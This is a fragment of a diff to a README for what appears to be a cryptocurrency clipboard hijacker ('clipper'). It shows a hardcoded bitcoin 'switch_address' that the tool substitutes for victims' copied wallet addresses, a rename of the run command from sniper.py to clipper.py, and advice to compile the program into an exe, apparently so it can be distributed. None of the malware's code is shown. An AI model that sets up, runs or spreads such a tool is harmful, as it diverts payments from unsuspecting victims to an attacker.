@@ -27,9 +27,9 @@ switch_address: str = "bc1qg7dvftcxxw5cphdrn3ddhawr000ft3um9gs788"
 ## Run the program
 I recommend that you compile it to an exe which you can find a tutorial for online however if you just wanna run it on your PC do the following:
 ```bash
-python sniper.py 
+python clipper.py 
 OR 
-python3 sniper.py
+python3 clipper.py
 ```
 
 ## NOTE:
